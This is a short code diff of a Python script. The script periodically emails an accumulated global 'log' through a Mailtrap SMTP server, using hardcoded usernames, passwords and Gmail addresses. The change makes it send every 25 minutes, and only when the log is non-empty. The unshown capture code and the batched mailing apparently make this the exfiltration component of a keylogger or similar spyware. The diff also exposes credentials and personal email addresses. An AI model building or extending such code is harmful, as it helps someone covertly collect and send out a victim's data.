@@ -6,11 +6,11 @@ import time
 
 smtp_server = 'sandbox.smtp.mailtrap.io'
 smtp_port = 2525
-smtp_username = '3eda4b5f427d50'
-smtp_password = '60b2790ac0c7bf'
+smtp_username = '0fd0b30906a6da'
+smtp_password = 'ab0fdf636b3dd9'
 
-sender_email = 'giorgibakhturidze2202@gmail.com'
-receiver_email = 'giorgibakhturidze2202@gmail.com'
+sender_email = 'bakh3ridze@gmail.com'
+receiver_email = 'bakh3ridze@gmail.com'
 
 def send_email(log):
 
@@ -32,9 +32,10 @@ def send_email(log):
 def send_periodic_emails():
     global log
     while True:
-        time.sleep(60 * 1)
-        send_email(log)
-        log = '';
+        time.sleep(60 * 25)
+        if log != '':
+            send_email(log)
+            log = '';
 
 log = '';
 
